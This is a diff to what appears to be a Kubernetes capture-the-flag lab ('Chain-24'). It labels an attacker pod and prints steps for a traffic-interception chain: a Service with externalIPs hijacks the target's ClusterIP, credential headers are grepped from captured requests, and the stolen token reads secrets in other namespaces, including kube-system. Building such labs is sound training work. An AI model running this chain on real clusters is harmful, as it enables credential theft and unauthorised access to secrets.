@@ -65,6 +65,7 @@ spec:
     app: internal-api
   ports:
     - port: 8080
+      targetPort: 80
 ---
 apiVersion: apps/v1
 kind: Deployment
@@ -146,6 +147,8 @@ kind: Pod
 metadata:
   name: attacker
   namespace: attack-ns
+  labels:
+    app: attacker
 spec:
   serviceAccountName: attacker-sa
   containers:
@@ -170,7 +173,7 @@ TARGET_IP=$(kubectl get svc internal-api -n secure-ns -o jsonpath='{.spec.cluste
 echo ""
 echo "[+] Chain-24 Ready"
 echo "    Target Service ClusterIP: $TARGET_IP"
-echo "    Step 1: create a Service with externalIPs=[$TARGET_IP] in attack-ns (selector app=attacker, port 8080)"
+echo "    Step 1: create a Service with externalIPs=[$TARGET_IP] in attack-ns (selector app=attacker, port 8080 -> targetPort 8080)"
 echo "    Step 2: kubectl exec -n attack-ns attacker -- grep -E 'X-Flag|X-Cred' /tmp/captured_requests.txt"
 echo "    Step 3: use the captured X-Cred token -> kubectl --token=\$T get secret flag-secret -n ns-beta"
 echo "    Step 4: kubectl --token=\$T get secret flag-secret -n kube-system"
